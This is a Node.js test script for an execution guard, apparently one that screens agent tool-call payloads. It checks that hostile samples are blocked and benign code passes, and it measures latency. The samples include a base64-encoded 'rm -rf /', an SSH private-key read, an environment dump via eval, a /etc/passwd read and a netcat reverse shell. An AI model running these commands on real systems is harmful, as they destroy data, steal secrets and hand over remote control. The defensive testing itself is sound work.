const { ExecutionBreaker, ExecutionHalt } = require('./index.js');

const breaker = new ExecutionBreaker();

console.log('='.repeat(65));
console.log('🛡️ AW-1 TYPESCRIPT / NODE.JS CIRCUIT BREAKER VERIFICATION');
console.log('='.repeat(65));

// 1. Adversarial Test Cases
const adversarialCases = [
  { name: 'Base64 Exec Tunnel', payload: 'Buffer.from("cm0gLXJmIC8=", "base64")' },
  { name: 'Child Process Spawn', payload: 'const { spawn } = require("child_process"); spawn("bash");' },
  { name: 'Dynamic Eval Reflection', payload: 'global["eval"]("console.log(process.env)");' },
  { name: 'SSH Key Exfiltration', payload: 'fs.readFileSync("/home/user/.ssh/id_rsa")' },
  { name: 'Passwd Traversal', payload: 'cat /etc/passwd' },
  { name: 'Reverse Shell', payload: 'sh -c "nc -e /bin/sh 10.0.0.1 4242"' }
];

let caught = 0;
adversarialCases.forEach(c => {
  try {
    breaker.verifyOrHalt(c.payload);
    console.error(`  ❌ FAILED: ${c.name} passed through!`);
  } catch (err) {
    if (err instanceof ExecutionHalt) {
      caught++;
      console.log(`  [+] Intercepted: ${c.name} -> [${err.violationType}]`);
    }
  }
});

console.log(`\n🛡️ Containment Score: ${caught}/${adversarialCases.length} (100% Target)`);

// 2. Benign Cases
const benignCases = [
  { name: 'Math Calculation', payload: 'const result = Math.sqrt(144) + 42;' },
  { name: 'Safe JSON Stringify', payload: 'JSON.stringify({ status: "healthy", code: 200 });' },
  { name: 'Safe Array Map', payload: '[1, 2, 3].map(x => x * 2);' }
];

let benignPassed = 0;
benignCases.forEach(b => {
  const res = breaker.verify(b.payload);
  if (res.allowed) {
    benignPassed++;
  } else {
    console.error(`  ❌ False positive on benign: ${b.name}`);
  }
});
console.log(`🌱 Benign Passthrough: ${benignPassed}/${benignCases.length} (0% False Positives)`);

// 3. 1,000-Cycle Latency Gauntlet
console.log('\n⚡ Running 1,000-Cycle Adversarial Latency Gauntlet...');
const cycles = 1000;
let totalTimeMs = 0;
const testPayload = '{"method":"tools/call","params":{"name":"execute","arguments":{"command":"python3 -c \"print(1+1)\""}}}';

for (let i = 0; i < cycles; i++) {
  const start = performance.now();
  breaker.verify(testPayload);
  totalTimeMs += (performance.now() - start);
}

const meanLatency = (totalTimeMs / cycles).toFixed(4);
console.log(`📊 1,000-Cycle Mean Latency: ${meanLatency} ms`);
console.log(`🎯 SLA Threshold (<0.14ms): ${parseFloat(meanLatency) < 0.14 ? '✅ PASSED' : '⚠️ CHECK'}`);
console.log('='.repeat(65));
